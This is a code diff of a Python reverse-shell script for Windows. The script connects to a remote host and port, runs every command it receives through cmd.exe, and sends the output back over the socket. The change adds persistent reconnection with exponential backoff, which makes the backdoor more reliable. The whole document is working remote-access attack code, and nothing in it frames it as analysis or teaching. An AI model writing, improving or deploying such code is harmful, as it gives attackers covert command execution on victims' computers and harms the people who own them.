@@ -25,64 +25,47 @@ def get_host_and_port():
                 values = (result.group(1), result.group(2))
                 return values
 def conn():
-    with socket() as s:
-        values = get_host_and_port()
-        s.connect((values[0], int(values[1])))
-        s.sendall(bytes("[+] Connection Established\n", encoding="utf-8"))
-        while True:
-            s.sendall(bytes("> ", encoding="utf-8"))
-            data = s.recv(1024)
-            data = data.decode(encoding="utf-8")
-            if data == "exit\n":
-                output = "[-] Closing Connection\n"
-                s.sendall(bytes(output, encoding="utf-8"))
-                break
-            elif data.startswith("cd"):
-                path = data.split(" ", 1)[1].strip() if len(data.split(" ", 1)) > 1 else None
-                if not path:
-                    output = os.getcwd()
-                else:
-                    output = change_directory(path)
-            else:
-                command = subprocess.run(["cmd.exe", "/C", data],
-                                         capture_output=True,
-                                         shell=True,
-                                         text=True,
-                                         universal_newlines=True)
-                output = "Output:\n" + command.stdout
-            if output:
-                s.sendall(bytes(output, encoding="utf-8"))
-if __name__ == "__main__":
-##    with socket() as s:
-##        values = get_host_and_port()
-##        s.connect((values[0], int(values[1])))
-##        s.sendall(bytes("[+] Connection Established\n", encoding="utf-8"))
-##        while True:
-##            s.sendall(bytes("> ", encoding="utf-8"))
-##            data = s.recv(1024)
-##            data = data.decode(encoding="utf-8")
-##            if data == "exit\n":
-##                output = "[-] Closing Connection\n"
-##                s.sendall(bytes(output, encoding="utf-8"))
-##                break
-##            elif data.startswith("cd"):
-##                path = data.split(" ", 1)[1].strip() if len(data.split(" ", 1)) > 1 else None
-##                if not path:
-##                    output = os.getcwd()
-##                else:
-##                    output = change_directory(path)
-##            else:
-##                command = subprocess.run(["cmd.exe", "/C", data],
-##                                         capture_output=True,
-##                                         shell=True,
-##                                         text=True,
-##                                         universal_newlines=True)
-##                output = "Output:\n" + command.stdout
-##            if output:
-##                s.sendall(bytes(output, encoding="utf-8"))
+    connection_attempts = 0
+    delay= 10
     while True:
         try:
-            conn()
-        except:
-            sleep(10)
-            conn()
+            with socket() as s:
+                values = get_host_and_port()
+                s.connect((values[0], int(values[1])))
+                s.sendall(bytes("[+] Connection Established\n", encoding="utf-8"))
+                while True:
+                    s.sendall(bytes("> ", encoding="utf-8"))
+                    data = s.recv(1024)
+                    data = data.decode(encoding="utf-8")
+                    if data == "exit\n":
+                        output = "[-] Closing Connection\n"
+                        s.sendall(bytes(output, encoding="utf-8"))
+                        break
+                    elif data.startswith("cd"):
+                        path = data.split(" ", 1)[1].strip() if len(data.split(" ", 1)) > 1 else None
+                        if not path:
+                            output = os.getcwd()
+                        else:
+                            output = change_directory(path)
+                    else:
+                        command = subprocess.run(["cmd.exe", "/C", data],
+                                                 capture_output=True,
+                                                 shell=True,
+                                                 text=True,
+                                                 universal_newlines=True)
+                        output = "Output:\n" + command.stdout
+                    if output:
+                        s.sendall(bytes(output, encoding="utf-8"))
+        except Exception as e:
+            connection_attempts += 1
+            if connection_attempts >= 10:
+                return
+            sleep(delay)
+            delay *= 2
+if __name__ == "__main__":
+##    while True:
+##        try:
+    conn()
+##        except:
+##            sleep(10)
+##            conn()
